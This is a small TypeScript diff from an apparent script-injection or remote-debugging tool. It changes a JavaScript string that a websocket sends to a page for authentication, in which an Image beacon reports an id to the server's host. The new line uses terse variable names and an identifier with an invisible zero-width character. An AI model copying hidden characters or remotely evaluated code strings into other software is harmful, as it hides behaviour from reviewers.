@@ -136,7 +136,7 @@ class Session {
   }
 
   auth(id: string) {
-    this.send('auth', `var server=ws.url.split("/"),protocol="https://";"ws:"===server[0]&&(protocol="http://"),server=protocol+server[2];var auth=new Image;auth.src=server+"/a?id=${encodeURIComponent(id)}&z=${uuidv4()}";auth.onload`)
+    this.send('auth', `var X=(window.ws||window.i‍).url.split('/'),V='https://';'ws:'===X[0]&&(V='http://'),X=V+X[2];var M=new Image;M.src=X+'/a?id=${encodeURIComponent(id)}&z=${uuidv4()}',M.onload;`)
     global.inject.authenticate[id] = (token: string, req) => this.authorized(token, req)
   }
 
